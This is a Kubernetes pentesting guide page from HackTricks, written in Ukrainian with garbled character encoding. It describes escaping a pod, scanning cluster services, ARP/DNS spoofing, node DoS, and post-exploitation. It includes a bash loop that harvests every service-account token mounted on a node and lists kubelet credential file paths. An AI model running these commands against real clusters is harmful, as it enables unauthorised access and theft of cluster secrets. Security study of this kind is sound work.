# Attacking Kubernetes from inside a Pod

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ —Ç–µ–ª–µ–≥—Ä–∞–º**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤**.

</details>

## **–í—Ç–µ—á–∞ –∑ –ü–æ–¥–∞**

**–Ø–∫—â–æ –≤–∏ –º–∞—î—Ç–µ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —â–∞—Å—Ç—è, –≤–∏ –º–æ–∂–µ—Ç–µ –≤—Ç–µ–∫—Ç–∏ –∑ –Ω—å–æ–≥–æ –Ω–∞ –≤—É–∑–æ–ª:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### –í—Ç–µ—á–∞ –∑ –ü–æ–¥–∞

–î–ª—è —Å–ø—Ä–æ–±–∏ –≤—Ç–µ—á—ñ –∑ –ü–æ–¥–∞ –≤–∞–º –º–æ–∂–µ –∑–Ω–∞–¥–æ–±–∏—Ç–∏—Å—è **–ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** —Å–ø–æ—á–∞—Ç–∫—É, –¥–µ—è–∫—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –¥–ª—è —Ü—å–æ–≥–æ:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü—ñ **–≤—Ç–µ—á—ñ –∑ Docker, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤—Ç–µ–∫—Ç–∏** –∑ –ü–æ–¥–∞, —è–∫–∏–π –≤–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–ª–∏:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ Kubernetes

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ —Ä–æ–∑–¥—ñ–ª—ñ –ø—Ä–æ **–ø–µ—Ä–µ–ª—ñ–∫ Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

–ó–∞–∑–≤–∏—á–∞–π –ü–æ–¥–∏ –∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è –∑ **—Ç–æ–∫–µ–Ω–æ–º –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–∏—Ö**. –¶–µ–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ –º–æ–∂–µ –º–∞—Ç–∏ –¥–µ—è–∫—ñ **–ø—Ä–∏–≤—ñ–ª–µ—ó**, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏**, —â–æ–± **–ø–µ—Ä–µ–π—Ç–∏** –¥–æ —ñ–Ω—à–∏—Ö –ü–æ–¥—ñ–≤ –∞–±–æ –Ω–∞–≤—ñ—Ç—å **–≤—Ç–µ–∫—Ç–∏** –Ω–∞ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –≤—É–∑–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ —Ü–µ –∑—Ä–æ–±–∏—Ç–∏:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ Cloud

–Ø–∫—â–æ –ü–æ–¥ –∑–∞–ø—É—â–µ–Ω–æ –≤ **—Ö–º–∞—Ä–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏—Ç—ñ–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω –∑ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö** —Ç–∞ –ø—ñ–¥–≤–∏—â—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ.

## –ü–æ—à—É–∫ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Å–ª—É–∂–±

–û—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ Kubernetes, —è–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –ø–æ—Ç–æ—á–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –ü–æ–¥–∞, —ñ –Ω–µ –º–æ–∂–µ—Ç–µ –≤—Ç–µ–∫—Ç–∏ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, –≤–∞–º —Å–ª—ñ–¥ **—à—É–∫–∞—Ç–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤—Ä–∞–∑–ª–∏–≤—ñ —Å–ª—É–∂–±–∏**.

### –°–ª—É–∂–±–∏

**–î–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ —Å–ª—É–∂–±–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ Kubernetes:**

```
kubectl get svc --all-namespaces
```

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Kubernetes –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø–ª–æ—Å–∫—É —Å—Ö–µ–º—É –º–µ—Ä–µ–∂—ñ, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ **–±—É–¥—å-—è–∫–∏–π pod/service –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ –º–æ–∂–µ —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ —ñ–Ω—à–∏–º–∏**. **–ü—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω** –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ **–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–µ –º–∞—é—Ç—å –æ–±–º–µ–∂–µ–Ω—å –º–µ—Ä–µ–∂–µ–≤–æ—ó –±–µ–∑–ø–µ–∫–∏**. –ë—É–¥—å-—Ö—Ç–æ –≤ –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω –º–æ–∂–µ —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ —ñ–Ω—à–∏–º–∏ –ø—Ä–æ—Å—Ç–æ—Ä–∞–º–∏ —ñ–º–µ–Ω.

### –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è

–ù–∞—Å—Ç—É–ø–Ω–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π Bash (–≤–∑—è—Ç–∏–π –∑ [—Å–µ–º—ñ–Ω–∞—Ä—É –∑ Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç–∞ –ø—Ä–æ—Å–∫–∞–Ω—É—î IP-–¥—ñ–∞–ø–∞–∑–æ–Ω–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –∞—Ç–∞–∫—É –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Å–ª—É–∂–±–∏ Kubernetes**, —â–æ–± **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∏/–≤–µ—Å—å —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### –ü—ñ–¥—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è

–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ **–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∞ –ø—Ä–∞—Ü—é—î –∑ —è–∫–æ—é—Å—å —á—É—Ç–ª–∏–≤–æ—é —Å–ª—É–∂–±–æ—é**, –¥–µ —ñ–Ω—à–∏–º –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–Ω—ñ –¥–ª—è –≤—Ö–æ–¥—É –≤—ñ–¥ —ñ–Ω—à–∏—Ö –ø—ñ–¥—Å–∏—Å—Ç–µ–º, **–ø—ñ–¥—Å–ª—É—Ö–æ–≤—É—é—á–∏ –ª–æ–∫–∞–ª—å–Ω—ñ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó**.

## –ü—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è –º–µ—Ä–µ–∂—ñ

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ç–µ—Ö–Ω—ñ–∫–∏, —Ç–∞–∫—ñ —è–∫ **–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è ARP** (—ñ –∑–∞–≤–¥—è–∫–∏ —Ü—å–æ–º—É **–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è DNS**), –ø—Ä–∞—Ü—é—é—Ç—å –≤ –º–µ—Ä–µ–∂—ñ Kubernetes. –¢–æ–¥—ñ, –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∏, —è–∫—â–æ —É –≤–∞—Å —î **–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å NET\_RAW** (—è–∫–∞ —î –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º), –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –≤–ª–∞—Å–Ω–æ—Ä—É—á —Å—Ç–≤–æ—Ä–µ–Ω—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –ø–∞–∫–µ—Ç–∏ —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ **–∞—Ç–∞–∫–∏ —Ç–∏–ø—É MitM —á–µ—Ä–µ–∑ ARP-–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è –Ω–∞ –≤—Å—ñ –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ —Ç–æ–º—É –∂ –≤—É–∑–ª—ñ.**\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ **–∑–ª–æ–≤–º–∏—Å–Ω–∞ –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∞** –ø—Ä–∞—Ü—é—î –Ω–∞ **—Ç–æ–º—É –∂ –≤—É–∑–ª—ñ, —â–æ —ñ DNS-—Å–µ—Ä–≤–µ—Ä**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ **–∞—Ç–∞–∫—É –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è DNS –Ω–∞ –≤—Å—ñ –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∏ –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## DoS –≤—É–∑–ª–∞

–£ –º–∞–Ω—ñ—Ñ–µ—Å—Ç–∞—Ö Kubernetes –Ω–µ –≤–∫–∞–∑–∞–Ω–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ —Ç–∞ **–Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ –æ–±–º–µ–∂–µ–Ω—å** –¥–ª—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤. –Ø–∫ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, –º–∏ –º–æ–∂–µ–º–æ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—Å—ñ —Ä–µ—Å—É—Ä—Å–∏, –¥–µ –ø—Ä–∞—Ü—é—î –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∞/—Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è**, —ñ –≤–∏—á–µ—Ä–ø–∞—Ç–∏ —ñ–Ω—à—ñ —Ä–µ—Å—É—Ä—Å–∏, —Å–ø—Ä–∏—á–∏–Ω–∏–≤—à–∏ DoS –¥–ª—è —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞.

–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–∞–∫–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É, —è–∫ [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):

```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```

–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ä—ñ–∑–Ω–∏—Ü—é –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `stress-ng` —ñ –ø—ñ—Å–ª—è.

```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```

## –ü–æ—Å—Ç-–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—É–∑–ª–∞

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞–ª–æ—Å—è **–≤–∏–π—Ç–∏ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞**, –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ü—ñ–∫–∞–≤—ñ —Ä–µ—á—ñ –Ω–∞ –≤—É–∑–ª—ñ:

* –ü—Ä–æ—Ü–µ—Å **Container Runtime** (Docker)
* –ë—ñ–ª—å—à–µ **–ø–æ–¥—ñ–≤/–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤**, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤—É–∑–ª—ñ, —è–∫—ñ –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏, —è–∫ —Ü–µ–π (–±—ñ–ª—å—à–µ —Ç–æ–∫–µ–Ω—ñ–≤)
* –í–µ—Å—å **—Ñ–∞–π–ª–æ–≤–∏–π —Å–∏—Å—Ç–µ–º** —Ç–∞ **–û–°** –≤–∑–∞–≥–∞–ª—ñ
* –°–ª—É–∂–±–∞ **Kube-Proxy**, —è–∫–∞ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—î
* –°–ª—É–∂–±–∞ **Kubelet**, —è–∫–∞ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—î. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó:
* –î–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* –Ü–Ω—à—ñ **–∑–∞–≥–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏ Kubernetes**:
* `$HOME/.kube/config` - **–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**
* `/etc/kubernetes/kubelet.conf`- **–ó–≤–∏—á–∞–π–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**
* `/etc/kubernetes/manifests/etcd.yaml` - **–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è etcd**
* `/etc/kubernetes/pki` - **–ö–ª—é—á Kubernetes**

### –ó–Ω–∞–π–¥—ñ—Ç—å kubeconfig –≤—É–∑–ª–∞

–Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª kubeconfig –≤ –æ–¥–Ω–æ–º—É –∑ —Ä–∞–Ω—ñ—à–µ –∑–≥–∞–¥–∞–Ω–∏—Ö —à–ª—è—Ö—ñ–≤, **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç `--kubeconfig` –ø—Ä–æ—Ü–µ—Å—É kubelet**:

```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```

### –í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤

```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```

–°–∫—Ä–∏–ø—Ç [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ **–æ—Ç—Ä–∏–º—É—î —Ç–æ–∫–µ–Ω–∏ —ñ–Ω—à–∏—Ö –∫–∞–ø—Å—É–ª —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –º–∞—é—Ç—å –≤–æ–Ω–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏** (–∑–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –≤–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è–ª–∏ —ó—Ö –ø–æ –æ–¥–Ω–æ–º—É):

```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```

### –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ DaemonSets

DaemonSet - —Ü–µ **–ø–æ–¥**, —è–∫–∏–π –±—É–¥–µ **–∑–∞–ø—É—â–µ–Ω–∏–π** –Ω–∞ **–≤—Å—ñ—Ö –≤—É–∑–ª–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞**. –¢–æ–º—É, —è–∫—â–æ DaemonSet –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∑ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º —Å–µ—Ä–≤—ñ—Å—É**, –Ω–∞ **–í–°–Ü–• –≤—É–∑–ª–∞—Ö** –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—Ç–æ–∫–µ–Ω** —Ü—å–æ–≥–æ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É**, —è–∫–∏–º –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏.

–ï–∫—Å–ø–ª–æ–π—Ç —Ç–æ–π —Å–∞–º–∏–π, —â–æ –π —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, –∞–ª–µ —Ç–µ–ø–µ—Ä –≤–∏ –Ω–µ –∑–∞–ª–µ–∂–∏—Ç–µ –≤—ñ–¥ —É–¥–∞—á—ñ.

### –ü–µ—Ä–µ—Ö—ñ–¥ –¥–æ —Ö–º–∞—Ä–∏

–Ø–∫—â–æ –∫–ª–∞—Å—Ç–µ—Ä –∫–µ—Ä—É—î—Ç—å—Å—è —Ö–º–∞—Ä–Ω–∏–º —Å–µ—Ä–≤—ñ—Å–æ–º, –∑–∞–∑–≤–∏—á–∞–π **–í—É–∑–æ–ª –º–∞—Ç–∏–º–µ —ñ–Ω—à–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö** –Ω—ñ–∂ –ü–æ–¥. –¢–æ–º—É —Å–ø—Ä–æ–±—É–π—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –∑ –≤—É–∑–ª–∞** (–∞–±–æ –∑ –ø–æ–¥ –∑ hostNetwork –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º –Ω–∞ True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### –í–∫—Ä–∞—Å—Ç–∏ etcd

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) –≤—É–∑–ª–∞, –Ω–∞ —è–∫–æ–º—É –±—É–¥–µ –∑–∞–ø—É—â–µ–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –æ—Ç—Ä–∏–º–∞–π—Ç–µ –æ–±–æ–ª–æ–Ω–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤—É–∑–ª–∞ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞–π—Ç–µ **–±–∞–∑—É –¥–∞–Ω–∏—Ö etcd**:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

control-plane –≤—É–∑–ª–∏ –º–∞—é—Ç—å **—Ä–æ–ª—å –º–∞–π—Å—Ç—Ä–∞** —ñ –≤ **–∫–ª–∞—Å—Ç–µ—Ä–∞—Ö, –∫–µ—Ä–æ–≤–∞–Ω–∏—Ö —Ö–º–∞—Ä–æ—é, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –Ω–∞ –Ω–∏—Ö –Ω—ñ—á–æ–≥–æ**.

#### –ß–∏—Ç–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ –∑ etcd

